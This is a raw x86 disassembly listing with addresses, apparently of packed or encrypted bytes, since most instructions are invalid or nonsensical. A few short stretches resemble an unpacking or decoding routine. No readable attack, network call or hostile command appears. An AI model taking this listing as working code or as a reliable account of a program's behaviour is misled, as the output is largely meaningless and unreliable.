  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0x1b83fe94
  40ead0:	cmp    DWORD PTR [eax+0x7cad9725],ecx
  40ead6:	jl     0x40ea7f
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40eb53
  40eadc:	shl    DWORD PTR [ecx+0xa],cl
  40eadf:	call   0xba13ad34
  40eae4:	retf   
  40eae5:	clc    
  40eae6:	add    bl,BYTE PTR [edx-0x6255835c]
  40eaec:	xchg   BYTE PTR [edi+0x42],dh
  40eaef:	rdmsr  
  40eaf1:	sub    al,BYTE PTR [ecx-0x42]
  40eaf4:	inc    ecx
  40eaf5:	aam    0x67
  40eaf7:	or     ch,dh
  40eaf9:	pop    esi
  40eafa:	pop    ebp
  40eafb:	pop    esp
  40eafc:	sub    eax,0xe0eacdb3
  40eb01:	popf   
  40eb02:	test   BYTE PTR [esi-0xd95d3d9],cl
  40eb08:	or     DWORD PTR [ecx+0x56db3498],ebp
  40eb0e:	lods   al,BYTE PTR ds:[esi]
  40eb0f:	jno    0x40eb04
  40eb11:	stc    
  40eb12:	in     eax,dx
  40eb13:	pop    edx
  40eb14:	out    0x6c,eax
  40eb16:	mov    eax,0xeb47d66b
  40eb1b:	adc    edi,eax
  40eb1d:	icebp  
  40eb1e:	stos   DWORD PTR es:[edi],eax
  40eb1f:	aad    0x65
  40eb21:	and    BYTE PTR [edx-0x52],dh
  40eb24:	mov    ch,0xcf
  40eb26:	xor    edi,ecx
  40eb28:	sub    BYTE PTR [eax],0xb6
  40eb2b:	inc    edi
  40eb2c:	repz add ebx,DWORD PTR [ebx+0x63]
  40eb30:	cmp    al,BYTE PTR [edi]
  40eb32:	fld    DWORD PTR [edi]
  40eb34:	outs   dx,DWORD PTR ds:[esi]
  40eb35:	loope  0x40eb4d
  40eb37:	dec    esi
  40eb38:	fdivr  QWORD PTR [ebx]
  40eb3a:	fld    TBYTE PTR ds:0xd125e519
  40eb40:	retf   
  40eb41:	test   eax,0x46697aa6
  40eb46:	adc    BYTE PTR [eax],0x61
  40eb49:	popa   
  40eb4a:	mov    DWORD PTR [edi+0xa8935c3],edx
  40eb50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb51:	gs dec ebx
  40eb53:	aad    0x95
  40eb55:	js     0x40eb1a
  40eb57:	loopne 0x40eb17
  40eb59:	ret    0xa291
  40eb5c:	add    esi,esi
  40eb5e:	xor    DWORD PTR [esi],esp
  40eb60:	shr    DWORD PTR [ebx-0x66acc6b1],1
  40eb66:	cmc    
  40eb67:	(bad)  
  40eb69:	inc    eax
  40eb6a:	or     BYTE PTR [ecx],bh
  40eb6c:	bound  eax,QWORD PTR [edi-0x17]
  40eb6f:	mov    cl,0xd
  40eb71:	nop
  40eb72:	pop    ss
  40eb73:	xor    eax,0x8dcc897d
  40eb78:	(bad)  
  40eb79:	push   0x39
  40eb7b:	test   DWORD PTR es:[esi],0x6530db85
  40eb82:	mov    bh,0x91
  40eb84:	sbb    bl,bl
  40eb86:	lds    ecx,FWORD PTR [edi+0x1f]
  40eb89:	test   BYTE PTR [eax+0x43],dh
  40eb8c:	and    dl,BYTE PTR [ebx-0x5d]
  40eb8f:	push   esp
  40eb90:	adc    esi,DWORD PTR [edi]
  40eb92:	mov    al,0x78
  40eb94:	mov    al,ds:0x477e8a6e
  40eb99:	or     DWORD PTR [esi],eax
  40eb9b:	sbb    DWORD PTR [ebx],ecx
  40eb9d:	sti    
  40eb9e:	xor    BYTE PTR ds:0x6adcc26a,cl
  40eba4:	push   ecx
  40eba5:	shl    dl,1
  40eba7:	or     eax,0x24377394
  40ebac:	out    dx,al
  40ebad:	inc    ecx
  40ebae:	pop    edi
  40ebaf:	retf   0xf853
  40ebb2:	add    ecx,DWORD PTR [esi+0x7f29c5c6]
  40ebb8:	imul   esi,DWORD PTR [esi+0x3c3d1489],0x52
  40ebbf:	je     0x40ebc4
  40ebc1:	test   al,ch
  40ebc3:	das    
  40ebc4:	inc    eax
  40ebc5:	pop    es
  40ebc6:	cdq    
  40ebc7:	lahf   
  40ebc8:	test   DWORD PTR [ebx+ebp*4],edi
  40ebcb:	fisttp QWORD PTR [esi+0x5693c158]
  40ebd1:	push   cs
  40ebd2:	es out dx,al
  40ebd4:	sbb    al,0xb
  40ebd6:	or     bh,BYTE PTR [esi+0x3a0e83e0]
  40ebdc:	jg     0x40ebe9
  40ebde:	pop    edi
  40ebdf:	out    0x89,eax
  40ebe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe2:	data16 and al,ah
  40ebe5:	mov    cl,BYTE PTR [eax-0x5b]
  40ebe8:	mov    esi,0x6f8913e6
  40ebed:	push   edx
  40ebee:	bnd jns 0x40ebe8
  40ebf1:	mov    bh,0xd3
  40ebf3:	ss lock fistp DWORD PTR cs:[esi]
  40ebf8:	leave  
  40ebf9:	dec    ecx
  40ebfa:	shl    BYTE PTR [ecx-0x51017806],1
  40ec00:	lods   eax,DWORD PTR ds:[esi]
  40ec01:	push   edi
  40ec02:	add    eax,DWORD PTR [esi-0xc97cc5a]
  40ec08:	call   0xd96c8a21
  40ec0d:	cmp    eax,0xd4981bf6
  40ec12:	stos   DWORD PTR es:[edi],eax
  40ec13:	fiadd  DWORD PTR ds:0x2b0109b8
  40ec19:	(bad)  
  40ec1a:	cwde   
  40ec1b:	xchg   edx,ebp
  40ec1d:	test   al,0xb1
  40ec1f:	push   ebp
  40ec20:	fdivr  st,st(1)
  40ec22:	push   es
  40ec23:	xor    DWORD PTR [esi+esi*1+0x7bf344d3],esi
  40ec2a:	dec    esp
  40ec2b:	pop    ss
  40ec2c:	les    ecx,FWORD PTR [ebp-0x1ecdefe6]
  40ec32:	and    eax,0x6fce0dd9
  40ec37:	add    esp,edi
  40ec39:	and    al,0xbf
  40ec3b:	cwde   
  40ec3c:	pop    es
  40ec3d:	dec    eax
  40ec3e:	shl    DWORD PTR [ecx],1
  40ec40:	adc    al,0xd4
  40ec42:	das    
  40ec43:	jge    0x40ec54
  40ec45:	mov    al,0x55
  40ec47:	pop    edi
  40ec48:	push   edi
  40ec49:	push   eax
  40ec4a:	scas   al,BYTE PTR es:[edi]
  40ec4b:	lea    esi,[esp+edi*4+0x7e]
  40ec4f:	push   0x797cb641
  40ec54:	mov    edi,edi
  40ec56:	sub    DWORD PTR [edi+0x40],edi
  40ec59:	adc    eax,0xa5070f09
  40ec5e:	or     bh,dh
  40ec60:	push   0xffffff87
  40ec62:	push   ebp
  40ec63:	shl    BYTE PTR [eax+0x4a],cl
  40ec66:	pop    esi
  40ec67:	mov    al,ds:0xfc365a6e
  40ec6c:	sub    BYTE PTR [ebp-0x258095ff],ch
  40ec72:	mov    eax,0x526892c0
  40ec77:	pop    ss
  40ec78:	dec    eax
  40ec79:	repz (bad) 
  40ec7b:	xchg   ecx,eax
  40ec7c:	(bad)
  40ec7f:	sbb    eax,0xeff9551f
  40ec84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec85:	rol    edx,cl
  40ec87:	push   ebp
  40ec88:	rcl    BYTE PTR [eax+0x3f89331d],0x51
  40ec8f:	jns    0x40ec67
  40ec91:	jmp    0x40eca0
  40ec93:	test   eax,0x75a19910
  40ec98:	lods   eax,DWORD PTR ds:[esi]
  40ec99:	call   0x3c8bfc03
  40ec9e:	das    
  40ec9f:	add    al,0x11
  40eca1:	ins    DWORD PTR es:[edi],dx
  40eca2:	push   esi
  40eca3:	cwde   
  40eca4:	push   ecx
  40eca5:	mov    DWORD PTR [edi-0x46b9e8b],0x9ac862d3
  40ecaf:	test   eax,0xb556e4c5
  40ecb4:	js     0x40ecfb
  40ecb6:	scas   eax,DWORD PTR es:[edi]
  40ecb7:	inc    esi
  40ecb8:	jg     0x40ec5f
  40ecba:	jmp    0x12aa:0x3a5a0689
  40ecc1:	mov    esi,0x6031b6ce
  40ecc6:	ror    DWORD PTR ds:0xe53b2ca9,1
  40eccc:	push   ds
  40eccd:	xchg   ecx,eax
  40ecce:	cmp    ebx,DWORD PTR [ecx+0x10]
  40ecd1:	add    BYTE PTR [ebx+edx*8+0x7073ea24],dl
  40ecd8:	rcl    BYTE PTR [edx+0x62],1
  40ecdb:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40ecdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecde:	sbb    al,0xed
  40ece0:	xor    edi,DWORD PTR [ebp+0x72f7ed44]
  40ece6:	mov    al,0x66
  40ece8:	pop    ecx
  40ece9:	cmp    BYTE PTR [edi+0x73],0xac
  40eced:	out    dx,al
  40ecee:	push   eax
  40ecef:	lock dec eax
  40ecf1:	and    dl,cl
  40ecf3:	daa    
  40ecf4:	fstp   DWORD PTR [ecx-0x7383f108]
  40ecfa:	mov    edx,fs
  40ecfc:	push   ds
  40ecfd:	in     al,0xa3
  40ecff:	add    DWORD PTR [ebp+eax*8-0x4f5eb282],esp
  40ed06:	inc    ecx
  40ed07:	scas   al,BYTE PTR es:[edi]
  40ed08:	adc    bl,BYTE PTR [edi+0x57]
  40ed0b:	mov    DWORD PTR [eax],ecx
  40ed0d:	ins    BYTE PTR es:[edi],dx
  40ed0e:	mov    ebp,DWORD PTR [eax]
  40ed10:	push   ds
  40ed11:	add    ch,BYTE PTR [eax+0x5d]
  40ed14:	dec    esp
  40ed15:	dec    edi
  40ed16:	lods   al,BYTE PTR ds:[esi]
  40ed17:	inc    edi
  40ed18:	push   0x412beaa
  40ed1d:	ss add al,0x8c
  40ed20:	mov    esi,0xc52b20b9
  40ed25:	mov    DWORD PTR [ebx-0x6cfea7ca],esp
  40ed2b:	add    eax,0x4afee63b
  40ed30:	sbb    ecx,DWORD PTR [ecx]
  40ed32:	xchg   edi,eax
  40ed33:	stos   DWORD PTR es:[edi],eax
  40ed34:	pushf  
  40ed35:	jb     0x40ed29
  40ed37:	sbb    DWORD PTR [ebp+eax*1+0x64],ebx
  40ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3c:	(bad)  
  40ed3d:	ins    DWORD PTR es:[edi],dx
  40ed3e:	(bad)  
  40ed3f:	je     0x40ed90
  40ed41:	outs   dx,DWORD PTR ds:[esi]
  40ed42:	daa    
  40ed43:	sbb    eax,esp
  40ed45:	push   es
  40ed46:	imul   eax,DWORD PTR ds:0x82147261,0x1c
  40ed4d:	cmp    edi,ebp
  40ed4f:	and    esp,DWORD PTR [esi]
  40ed51:	mov    ds:0xe9334980,al
  40ed56:	adc    eax,0xd6859e76
  40ed5b:	cld    
  40ed5c:	dec    ebx
  40ed5d:	xchg   esp,eax
  40ed5e:	inc    eax
  40ed5f:	sub    eax,0x43dcc9a0
  40ed64:	ror    ch,1
  40ed66:	inc    ebp
  40ed67:	test   al,0x84
  40ed69:	in     al,dx
  40ed6a:	xchg   edi,eax
  40ed6b:	dec    ebx
  40ed6c:	sbb    al,0x44
  40ed6e:	push   ebp
  40ed6f:	call   0x2859:0xac65d06c
  40ed76:	pop    esi
  40ed77:	inc    edi
  40ed78:	jg     0x40edf1
  40ed7a:	bnd jl 0x40ed26
  40ed7d:	cmp    al,0xf4
  40ed7f:	push   ebx
  40ed80:	mov    dl,0x66
  40ed82:	into   
  40ed83:	xor    BYTE PTR [ebx],ah
  40ed85:	das    
  40ed86:	push   0xb
  40ed88:	test   al,0x92
  40ed8a:	xchg   ebp,eax
  40ed8b:	outs   dx,BYTE PTR ds:[esi]
  40ed8c:	jle    0x40ee01
  40ed8e:	jp     0x40ed57
  40ed90:	pop    edx
  40ed91:	inc    ebx
  40ed92:	jg     0x40ed19
  40ed94:	shr    DWORD PTR [ebx-0xc],1
  40ed97:	add    eax,0x40800ae5
  40ed9c:	and    edx,ecx
  40ed9e:	ror    DWORD PTR [edx+0x658133c2],0xab
  40eda5:	das    
  40eda6:	sbb    al,0xe7
  40eda8:	push   ecx
  40eda9:	mov    al,ds:0xd4dd4e52
  40edae:	pop    esi
  40edaf:	les    ecx,FWORD PTR [edx+ebp*2+0x2e58705d]
  40edb6:	push   esi
  40edb7:	xchg   edi,eax
  40edb8:	loop   0x40ee16
  40edba:	push   edx
  40edbb:	sbb    ebp,ebx
  40edbd:	fisttp DWORD PTR [ebp+0x75]
  40edc0:	ret    0xaa21
  40edc3:	je     0x40ede7
  40edc5:	into   
  40edc6:	pop    edi
  40edc7:	repz sub esp,ecx
  40edca:	cmp    dl,ch
  40edcc:	ret    
  40edcd:	lods   eax,DWORD PTR ds:[esi]
  40edce:	xchg   BYTE PTR [ebp-0x26],cl
  40edd1:	and    dh,BYTE PTR es:[edx+0xc]
  40edd5:	dec    eax
  40edd6:	sbb    DWORD PTR [eax-0x76],0xffffffaf
  40edda:	(bad)  
  40eddb:	jle    0x40ee0b
  40eddd:	pop    ebp
  40edde:	(bad)  
  40eddf:	jns    0x40edca
  40ede1:	pop    ds
  40ede2:	mov    edi,0x65cae536
  40ede7:	lods   al,BYTE PTR ds:[esi]
  40ede8:	repz call 0x1592:0x55639bdc
  40edf0:	ror    DWORD PTR [edx+0x4a],cl
  40edf3:	pop    ebx
  40edf4:	mov    ah,0xe2
  40edf6:	in     eax,dx
  40edf7:	mov    esp,0xb7e7cab2
  40edfc:	pop    ebp
  40edfd:	inc    ecx
  40edfe:	(bad)  
  40edff:	fwait
  40ee00:	inc    edi
  40ee01:	outs   dx,DWORD PTR ds:[esi]
  40ee02:	les    esi,FWORD PTR [ecx+0x37c410b3]
  40ee08:	(bad)  [eax]
  40ee0a:	add    dl,BYTE PTR [edi]
  40ee0c:	add    BYTE PTR [ebx],0x3e
  40ee0f:	pop    ds
  40ee10:	dec    ebp
  40ee11:	jbe    0x40ee77
  40ee13:	add    BYTE PTR [edi+ecx*4],bh
  40ee16:	in     eax,dx
  40ee17:	and    al,0x22
  40ee19:	pop    ebp
  40ee1a:	jmp    0xd32:0xf4336b79
  40ee21:	or     BYTE PTR [ecx+0x79],al
  40ee24:	xchg   BYTE PTR [ecx-0x73a0058a],ah
  40ee2a:	adc    eax,0xaca530e5
  40ee2f:	mov    edx,0xeae57e7e
  40ee34:	and    dh,ah
  40ee36:	dec    edx
  40ee37:	sub    DWORD PTR [esi+0xf],0xe4c65a0b
  40ee3e:	sbb    eax,0x8860dcc
  40ee43:	idiv   DWORD PTR [esi]
  40ee45:	mov    ebp,0xed7378f1
  40ee4a:	imul   edi,DWORD PTR [esi+0x40590e31],0x1d9aa636
  40ee54:	je     0x40ee01
  40ee56:	icebp  
  40ee57:	pop    es
  40ee58:	ja     0x40ee33
  40ee5a:	add    cl,BYTE PTR [ebx]
  40ee5c:	lahf   
  40ee5d:	xor    cl,BYTE PTR gs:[edx+0x7fcca9f0]
  40ee64:	adc    al,0x36
  40ee66:	test   al,0xe3
  40ee68:	outs   dx,BYTE PTR ds:[esi]
  40ee69:	(bad)  [edi]
  40ee6b:	mov    eax,ds:0xdda10f30
  40ee70:	in     eax,dx
  40ee71:	test   eax,0x3a59b7b8
  40ee76:	mov    edi,DWORD PTR gs:[eax+ebx*4+0x77]
  40ee7b:	call   0x1238285e
  40ee80:	jmp    DWORD PTR [eax]
  40ee82:	repnz fldenv [ebx+0x413b9a]
  40ee89:	mov    eax,DWORD PTR [ebp-0x4]
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea7:	inc    ecx
  40eea8:	xor    ebp,eax
  40eeaa:	ds test eax,0x79a77c7c
  40eeb0:	jl     0x40ef2e
  40eeb2:	cli    
  40eeb3:	xchg   DWORD PTR [edi-0x4b7f9fa0],edx
  40eeb9:	sbb    eax,0x1423b475
  40eebe:	adc    BYTE PTR [eax],bl
  40eec0:	nop
  40eec1:	xor    al,0x6e
  40eec3:	ds jmp 0xeb69:0x3feedfc4
  40eecb:	add    al,bh
  40eecd:	mov    eax,0x7560c9d6
  40eed2:	push   edi
  40eed3:	popa   
  40eed4:	push   es
  40eed5:	adc    BYTE PTR [edx],dh
  40eed7:	sub    eax,0x6b1f6a79
  40eedc:	mov    edx,0xd0818b94
  40eee1:	and    al,0xc8
  40eee3:	ror    ah,0x3c
  40eee6:	cmp    al,0x40
  40eee8:	data16 adc al,BYTE PTR [ebp-0x6]
  40eeec:	mov    dh,0x4
  40eeee:	jge    0x40ee72
  40eef0:	outs   dx,DWORD PTR ds:[esi]
  40eef1:	push   es
  40eef2:	jnp    0x40ef22
  40eef4:	imul   esp,DWORD PTR [ecx-0x15a6e2d5],0x34
  40eefb:	push   ss
  40eefc:	mov    eax,0x550f90f8
  40ef01:	aaa    
  40ef02:	retf   
  40ef03:	cs popa 
  40ef05:	cmp    eax,0x71a68622
  40ef0a:	sbb    eax,eax
  40ef0c:	test   DWORD PTR [ebx],0x8393e1c8
  40ef12:	and    al,0xa8
  40ef14:	mov    cl,0x26
  40ef16:	les    edx,FWORD PTR [eax-0x43c45c7d]
  40ef1c:	xlat   BYTE PTR ds:[ebx]
  40ef1d:	adc    DWORD PTR [esi+0x6],edi
  40ef20:	outs   dx,DWORD PTR ds:[esi]
  40ef21:	cmp    ch,bh
  40ef23:	daa    
  40ef24:	repz inc ecx
  40ef26:	lods   al,BYTE PTR ds:[esi]
  40ef27:	xor    ebx,ebx
  40ef29:	xchg   edx,eax
  40ef2b:	pop    ebp
  40ef2c:	daa    
  40ef2d:	(bad)  
  40ef2e:	fadd   st,st(6)
  40ef30:	loope  0x40ef47
  40ef32:	(bad)  
  40ef33:	test   ebx,0x76d9d826
  40ef39:	inc    ebx
  40ef3a:	mov    bl,ch
  40ef3c:	or     DWORD PTR [ebx-0x59d7141a],edi
  40ef42:	stc    
  40ef43:	dec    esi
  40ef44:	iret   
  40ef45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef46:	pop    ebp
  40ef47:	cmp    DWORD PTR ds:0xcae41654,esp
  40ef4d:	pop    ds
  40ef4e:	aad    0xc6
  40ef50:	imul   eax,DWORD PTR [edx-0x7c],0xffffffb8
  40ef54:	pop    ss
  40ef55:	mov    eax,0xffbd28ed
  40ef5a:	push   es
  40ef5b:	pop    eax
  40ef5c:	add    dl,BYTE PTR [ebx-0x15]
  40ef5f:	adc    bl,dl
  40ef61:	stos   BYTE PTR es:[edi],al
  40ef62:	jl     0x40efd7
  40ef64:	fwait
  40ef65:	and    eax,0xeda9d43b
  40ef6a:	(bad)  
  40ef6c:	test   BYTE PTR [ecx],dl
  40ef6e:	iret   
  40ef6f:	cmp    al,0x98
  40ef71:	out    dx,eax
  40ef72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef73:	test   esp,ebx
  40ef75:	pop    ds
  40ef76:	mov    ah,0x55
  40ef78:	add    eax,0xfadc026b
  40ef7d:	inc    ebx
  40ef7e:	xchg   edx,eax
  40ef7f:	jp     0x40efd5
  40ef81:	adc    eax,0xcc493f28
  40ef86:	mov    esi,0xc2c0f152
  40ef8b:	cmp    dl,BYTE PTR [edi-0x40]
  40ef8e:	stos   DWORD PTR es:[edi],eax
  40ef8f:	imul   eax,DWORD PTR [edx-0x35],0x2
  40ef93:	gs sahf 
  40ef95:	pop    ecx
  40ef96:	or     al,0xa2
  40ef99:	push   es
  40ef9a:	test   cl,0x7
  40ef9d:	adc    BYTE PTR [edx+0x5],dl
  40efa0:	fwait
  40efa1:	pop    ebx
  40efa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa3:	jmp    FWORD PTR [edi-0x6f0ab1e1]
  40efa9:	add    DWORD PTR [esi],edx
  40efab:	fwait
  40efac:	add    DWORD PTR [eax+0x1144996a],edi
  40efb2:	dec    ebx
  40efb3:	inc    eax
  40efb4:	shr    dl,cl
  40efb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efb8:	stc    
  40efb9:	mov    bh,0x71
  40efbb:	mov    esi,0x5689d8ea
  40efc0:	daa    
  40efc1:	xor    edi,DWORD PTR [esi-0x12]
  40efc4:	and    edx,DWORD PTR [eax-0x4aacc86e]
  40efca:	(bad)  [esi-0x40]
  40efcd:	cdq    
  40efce:	ja     0x40f001
  40efd0:	xor    eax,0x2e5ed8ce
  40efd5:	ds aas 
  40efd7:	cli    
  40efd8:	clc    
  40efd9:	ret    
  40efda:	mov    ebp,0x8a1e6988
  40efdf:	mov    ds:0x9d8968e9,al
  40efe4:	mov    ?,WORD PTR [ecx-0x4c]
  40efe7:	pushf  
  40efe8:	rcr    DWORD PTR [edi],cl
  40efea:	int3   
  40efeb:	fwait
  40efec:	(bad)  
  40efed:	fiadd  DWORD PTR [esi-0x160c92a5]
  40eff3:	ja     0x40ef93
  40eff5:	aad    0x79
  40eff7:	sbb    DWORD PTR [edx-0x786ebf9a],esp
  40effd:	pop    ecx
  40effe:	push   esi
  40efff:	push   eax
  40f000:	jae    0x40f017
  40f002:	xor    DWORD PTR [esi],esi
  40f004:	and    eax,0xe5260e16
  40f009:	push   ebp
  40f00a:	mov    bh,0x51
  40f00c:	mov    esp,0x4edcd276
  40f011:	outs   dx,BYTE PTR ds:[esi]
  40f012:	loopne 0x40eff0
  40f014:	popa   
  40f015:	imul   DWORD PTR [ecx]
  40f017:	mov    eax,0x7e8121e0
  40f01c:	sub    DWORD PTR [edx],ebp
  40f01e:	popa   
  40f01f:	rol    BYTE PTR [eax+0x43171fb0],1
  40f025:	std    
  40f026:	in     eax,dx
  40f027:	jg     0x40f052
  40f029:	xchg   BYTE PTR [edi-0x78],cl
  40f02c:	adc    eax,0x55119553
  40f031:	int3   
  40f032:	repz sub eax,0x9ccf3e0f
  40f038:	xchg   esi,eax
  40f039:	sbb    al,0xcb
  40f03b:	jg     0x40efc8
  40f03d:	stos   DWORD PTR es:[edi],eax
  40f03e:	loope  0x40efde
  40f040:	adc    al,0xe2
  40f042:	inc    ecx
  40f043:	mov    dh,0x6c
  40f045:	div    BYTE PTR [ebp+0x30ca987d]
  40f04b:	inc    ebx
  40f04c:	(bad)  
  40f04d:	lahf   
  40f04e:	pop    ecx
  40f04f:	lds    ebp,FWORD PTR [esi]
  40f051:	cmp    BYTE PTR [ecx+0x207935c6],al
  40f057:	and    eax,0x53466f8d
  40f05c:	xchg   ecx,eax
  40f05d:	aas    
  40f05e:	add    edi,DWORD PTR [edx]
  40f060:	dec    ebp
  40f061:	popa   
  40f062:	iret   
  40f063:	pop    esp
  40f064:	pop    es
  40f065:	dec    esi
  40f066:	out    0xdc,al
  40f068:	adc    esi,DWORD PTR [esi+esi*1]
  40f06b:	or     cl,BYTE PTR [ecx+0x3a]
  40f06e:	outs   dx,DWORD PTR ds:[esi]
  40f06f:	stos   DWORD PTR es:[edi],eax
  40f070:	aad    0x8c
  40f072:	mov    al,0x3c
  40f074:	clc    
  40f075:	outs   dx,BYTE PTR ds:[esi]
  40f076:	sub    ebp,edi
  40f078:	mov    bh,BYTE PTR [edi-0x2d9c584c]
  40f07e:	sub    dh,dh
  40f080:	or     al,BYTE PTR [eax]
  40f082:	cmp    bh,BYTE PTR [ecx-0x4c]
  40f085:	out    0x8c,eax
  40f087:	ror    DWORD PTR [ebx+edx*4+0x74],1
  40f08b:	shl    bh,1
  40f08d:	fmulp  st(4),st
  40f08f:	inc    ebp
  40f090:	mov    dl,0xca
  40f092:	jne    0x40f0d6
  40f094:	pushf  
  40f095:	inc    ebx
  40f096:	scas   al,BYTE PTR es:[edi]
  40f097:	jns    0x40f066
  40f099:	int3   
  40f09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f09b:	mov    ebp,DWORD PTR [eax-0x2d1d29f8]
  40f0a1:	push   ss
  40f0a2:	sub    al,0xcd
  40f0a4:	dec    edx
  40f0a5:	adc    DWORD PTR [edi+0x3f],edx
  40f0a8:	push   cs
  40f0a9:	jo     0x40f0a8
  40f0ab:	mov    dl,0xc6
  40f0ad:	ret    
  40f0ae:	pusha  
  40f0af:	out    dx,eax
  40f0b0:	ja     0x40f12c
  40f0b2:	(bad)  
  40f0b3:	(bad)  
  40f0b5:	lock sub BYTE PTR [esi],dl
  40f0b8:	ins    DWORD PTR es:[edi],dx
  40f0b9:	or     DWORD PTR [eax],0x30
  40f0bc:	imul   ecx,DWORD PTR [ecx+0x29],0xb195f0f0
  40f0c3:	sbb    al,0xe7
  40f0c5:	stos   BYTE PTR es:[edi],al
  40f0c6:	(bad)  
  40f0c8:	mov    bh,0x6
  40f0ca:	repnz mov ch,ch
  40f0cd:	lds    esi,FWORD PTR [ebx+0x3e]
  40f0d0:	inc    esi
  40f0d1:	das    
  40f0d2:	(bad)  
  40f0d3:	fist   DWORD PTR [eax]
  40f0d5:	xchg   edi,ecx
  40f0d7:	call   DWORD PTR [edi]
  40f0d9:	sbb    BYTE PTR [ebx+0x71],cl
  40f0dc:	outs   dx,BYTE PTR ds:[esi]
  40f0dd:	stos   DWORD PTR es:[edi],eax
  40f0de:	dec    edi
  40f0df:	or     al,0x9f
  40f0e1:	daa    
  40f0e2:	cwde   
  40f0e3:	test   BYTE PTR [edx+0x53],ch
  40f0e6:	fucomip st,st(3)
  40f0e8:	mov    edi,0xe490102e
  40f0ed:	mov    bl,ah
  40f0ef:	idiv   DWORD PTR [edi+0xb]
  40f0f2:	je     0x40f16d
  40f0f4:	pop    edi
  40f0f5:	xchg   DWORD PTR [eax],ecx
  40f0f7:	push   ebx
  40f0f8:	test   DWORD PTR [ebp+0x5016ea16],0xdb0ccd23
  40f102:	dec    ebx
  40f103:	nop
  40f104:	push   cs
  40f105:	clc    
  40f106:	xor    dl,al
  40f108:	jae    0x40f17d
  40f10a:	mov    esi,ebp
  40f10c:	sbb    cl,BYTE PTR [ebp-0xb2d43ef]
  40f112:	iret   
  40f113:	mov    ds:0xb4725528,eax
  40f118:	std    
  40f119:	test   al,0x6f
  40f11b:	adc    BYTE PTR [edi+0x77],ah
  40f11e:	cli    
  40f11f:	adc    ebp,0x54
  40f122:	fidiv  WORD PTR [esp+eiz*2+0x2146501b]
  40f129:	cmp    DWORD PTR [ecx-0x3468cb50],edx
  40f12f:	push   ds
  40f130:	mov    fs,WORD PTR [ebp+0x7a]
  40f133:	inc    esi
  40f134:	adc    BYTE PTR [edx],cl
  40f136:	xchg   esi,eax
  40f137:	sbb    DWORD PTR [eax-0x5877bb1f],edx
  40f13d:	mov    ecx,0x3b758456
  40f142:	xor    eax,0xca69e24e
  40f147:	and    al,0xe0
  40f149:	scas   eax,DWORD PTR es:[edi]
  40f14a:	or     eax,0x98daaddb
  40f14f:	xchg   esi,eax
  40f150:	or     al,BYTE PTR [ecx]
  40f152:	cmp    eax,DWORD PTR [edx-0x3892e519]
  40f158:	add    eax,0x3fac7ba4
  40f15d:	cmp    bh,ah
  40f15f:	repnz add BYTE PTR [ecx+edi*4+0x5211fa1e],bh
  40f167:	stos   DWORD PTR es:[edi],eax
  40f168:	shr    DWORD PTR [edx],0xf8
  40f16b:	inc    eax
  40f16c:	fs jns 0x40f197
  40f16f:	inc    esp
  40f170:	stos   BYTE PTR es:[edi],al
  40f171:	loope  0x40f1a3
  40f173:	xor    dl,BYTE PTR [ebx+0x1144ed8e]
  40f179:	icebp  
  40f17a:	jb     0x40f147
  40f17c:	and    BYTE PTR [ebp+eiz*2+0x17],0x36
  40f181:	mov    edi,0x1c8c24cd
  40f186:	dec    ecx
  40f187:	inc    edi
  40f188:	sbb    DWORD PTR [ebx+ebx*2-0x4d],ebp
  40f18c:	scas   al,BYTE PTR es:[edi]
  40f18d:	pop    edi
  40f18e:	js     0x40f1a1
  40f190:	cdq    
  40f191:	aam    0x9c
  40f193:	and    bl,BYTE PTR [ecx+0x2e]
  40f196:	in     al,0x38
  40f198:	mov    esi,ebp
  40f19a:	jne    0x40f1d6
  40f19c:	add    eax,0x25e2eb1e
  40f1a1:	popa   
  40f1a2:	mov    ?,WORD PTR [edi+0x65]
  40f1a5:	mov    ds:0xe81b3e03,al
  40f1aa:	js     0x40f1d6
  40f1ac:	pop    edx
  40f1ad:	or     eax,0x74139b5d
  40f1b2:	sbb    ebp,DWORD PTR [ebx]
  40f1b4:	add    ah,0x63
  40f1b7:	xor    ebx,DWORD PTR ds:0x4b1d4474
  40f1bd:	push   cs
  40f1be:	arpl   cx,dx
  40f1c0:	xchg   edi,eax
  40f1c1:	add    DWORD PTR [edi+0x449a7325],eax
  40f1c7:	jbe    0x40f229
  40f1c9:	dec    eax
  40f1ca:	or     DWORD PTR [edi+ecx*4-0x45],ebp
  40f1ce:	inc    eax
  40f1cf:	or     esp,DWORD PTR [edx+0x265bd3ef]
  40f1d5:	adc    ebx,DWORD PTR [eax-0x53]
  40f1d8:	pushf  
  40f1d9:	xchg   esi,eax
  40f1da:	xchg   ecx,eax
  40f1db:	outs   dx,BYTE PTR ds:[esi]
  40f1dc:	dec    eax
  40f1dd:	xchg   ebp,eax
  40f1de:	aaa    
  40f1df:	adc    ecx,DWORD PTR [edx+0x25f2b178]
  40f1e5:	je     0x40f245
  40f1e7:	fmul   st,st(3)
  40f1e9:	xlat   BYTE PTR ds:[ebx]
  40f1ea:	das    
  40f1eb:	pop    ebx
  40f1ec:	sub    bh,dl
  40f1ee:	mov    BYTE PTR [eax+0x64],al
  40f1f1:	in     al,0x6f
  40f1f3:	lea    eax,[eax-0x66]
  40f1f6:	in     al,0xa1
